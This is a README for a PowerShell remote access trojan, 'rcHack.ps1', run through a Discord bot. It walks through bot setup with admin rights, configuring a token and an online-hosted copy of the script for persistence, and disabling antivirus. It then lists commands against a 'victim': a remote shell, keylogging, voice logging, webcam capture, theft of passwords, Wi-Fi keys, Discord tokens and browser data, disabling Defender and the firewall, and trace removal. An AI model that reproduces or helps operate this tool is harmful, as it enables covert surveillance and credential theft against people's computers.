## How to Set Up the Discord Bot?

1. Go to [Discord Developer Portal](https://discord.com/developers/applications).
2. Click "New application," name it, and click "Create."
3. In the Bot tab, copy the bot token.
4. Under Privileged Gateway Intents, enable:
   - PRESENCE INTENT
   - SERVER MEMBERS INTENT
   - MESSAGE CONTENT INTENT
   Then click "Save Changes."
5. In the Oauth2 tab:
   - Under Redirects, type `http://localhost/`.
   - Enable the following:
     - `messages.read`
     - `applications.commands`
     - `bot`
   - Select redirect URL `http://localhost/` and add the
   - `admin` permission.
   - Copy the generated URL.
6. Open the copied URL in the browser and follow the steps to add the bot to your server.

Now the bot is set up. Update the `rcHack.ps1` file with the bot token and server ID.

# rcHack Discord Bot Setup

## Setup Instructions for rcHack.ps1

1. Open `rcHack.ps1` in a text editor.
2. Edit the following variables with your specific information:
   ```powershell
   $token = "YOUR_DISCORD_BOT_TOKEN_HERE"

   $guildId = "YOUR_DISCORD_SERVER_ID"

   $StartupPsOnlineFileLocation = "HTTPS://WWW.EXAMPLE.COM/URL_TO_YOUR_RCHACK_SCRIPT.PS1"
   ```
the `StartupPsOnlineFileLocation` url should lead to an online-hosted version of itself (an exact copy)


1. Creating the Bot
   ![Creating the Bot](images/1%20creating%20the%20bot.png)

2. Naming the Bot
   ![Naming the Bot](images/2%20naming%20the%20bot.png)

3. Bot Tab
   ![Bot Tab](images/3%20bot%20tab.png)

4. Reset Token
   ![Reset Token](images/4%20reset%20token.png)

5. Copy Token
   ![Copy Token](images/5%20copy%20token.png)

6. Privileged Gateway Intents
   ![Privileged Gateway Intents](images/6%20privileged%20gateway%20intents.png)

7. OAuth2
   ![OAuth2](images/7%20oauth2.png)

8. Redirect URL
   ![Redirect URL](images/8%20redirect%20url.png)

9. Permissions
   ![Permissions](images/9%20permissions.png)

10. Admin
    ![Admin](images/10%20admin.png)

11. Add Bot
    ![Add Bot](images/11%20add%20bot.png)

---

# `Depending on your version of windows and if you have an av installed, you may need to disable your antivirus and windows defender.`

```plaintext
COMMAND_NAME                           |                           PARAMETERS
--------------------------------------------------------------------------------
If you see 'Requires admin.', that means the script wasn't run as administrator.
--------------------------------------------------------------------------------
E          X          A          M          P          L          E          S

1. !cmd               // Executes a command in cmd and returns the output
   Example: !cmd ipconfig

2. !powershell        // Executes a command in PowerShell and returns the output
   Example: !powershell ipconfig

3. !dir               // Displays the current directory
   Example: !dir

4. !cd                // Changes the current directory
   Example: !cd C:\location\of\file

5. !download          // Downloads a file from a specified location or current directory
   Example: !download C:\location\of\file\file.txt
   Example: !download file.txt

6. !upload {ATTACHMENT} // Uploads any attachment to the current directory
   Example: !upload {ATTACHMENT}

7. !delete            // Deletes a specified file or directory
   Example: !delete C:\location\of\file\file.txt

8. !availwifi         // Retrieves available Wi-Fi networks
   Example: !availwifi

9. !wifipass          // Retrieves Wi-Fi passwords
   Example: !wifipass

10. !screenshot        // Captures a screenshot of the victim's screen
    Example: !screenshot

11. !webcampic         // Captures and returns a picture from the webcam
    Example: !webcampic

12. !wallpaper         // Changes the wallpaper of the victim's computer
    Example: !wallpaper C:\path\to\wallpaper.jpg

13. !keylogger         // Activates keylogger to record keystrokes
    Example: !keylogger

14. !getkeylog         // Retrieves the logged keystrokes
    Example: !getkeylog

15. !voicelogger       // Activates voicelogger to transcribe spoken words
    Example: !voicelogger

16. !getvoicelog       // Retrieves the logged voice recordings
    Example: !getvoicelog

17. !disabledefender   // Disables Windows Defender
    Example: !disabledefender

18. !disablefirewall   // Disables the Windows Firewall
    Example: !disablefirewall

19. !shutdown          // Shuts down the victim's computer
    Example: !shutdown

20. !restart           // Restarts the victim's computer
    Example: !restart

21. !logoff            // Logs off the user from the victim's computer
    Example: !logoff

22. !msgbox            // Displays a customizable message box
    Example: !msgbox TITLE_HERE,MESSAGE_HERE,Warning,YesNoCancel

23. !hackergoose       // Employs a specialized goose for real-time hacking
    Example: !hackergoose

24. !website           // Opens a specified website
    Example: !website www.example.com

25. !minapps           // Minimizes all windows on the victim's computer
    Example: !minapps

26. !ip                // Retrieves the victim's IP address
    Example: !ip

27. !passwords          // Retrieves the victim's saved passwords
    Example: !passwords

28. !tokengrabber       //Retrieves discord tokens
    Example: !tokengrabber

29. !browserdata       // Retrieves browser data
    Example: !browserdata

30. !networkscan       // Scans and retrieves information about the network
    Example: !networkscan

31. !volume            // Adjusts the volume of the victim's computer
    Example: !volume 50

32. !voice             // Makes the victim's computer speak a specified message
    Example: !voice You are hacked!

33. !proclist       // Retrieves a list of all running processes
    Example: !proclist

34. !prockill          // Terminates a specified process
    Example: !prockill process_name.exe

35. !write             // Types a specified message
    Example: !write Hello, world!

36. !clipboard         // Retrieves the last copied item
    Example: !clipboard

37. !idletime          // Retrieves the duration of the victim's idle time in seconds
    Example: !idletime

38. !datetime          // Retrieves the date and time of the victim's computer
    Example: !datetime

39. !bluescreen        // Triggers a blue screen on the victim's computer
    Example: !bluescreen

40. !delpasswords      // Deletes all passwords for all accounts on the current computer
    Example: !delpasswords

41. !geolocate         // Retrieves the victim's geolocation data
    Example: !geolocate

42. !block             // Blocks the victim's keyboard and mouse (requires admin)
    Example: !block

43. !unblock           // Unblocks the victim's keyboard and mouse (requires admin)
    Example: !unblock

44. !disabletaskmgr    // Disables Task Manager (requires admin)
    Example: !disabletaskmgr

45. !enabletaskmgr     // Enables Task Manager (requires admin)
    Example: !enabletaskmgr

46. !admin             //attempts to replace session with admin (shows prompt)
    Example: !admin

47. !startup           // Enables persistence for this script
        will add a ps1 script to startup
        on line 9, set the var StartupPsOnlineFileLocation to the full url of your ps1 file
    Example: !startup

48. !implode           // Triggers a system implosion (Leaves no trace)
    Example: !implode

49. !help              // Displays information about available commands
    Example: !help
```

special thanks to [@noom825](https://github.com/moom825/Discord-RAT-2.0/commits?author=moom825) for the dll's!
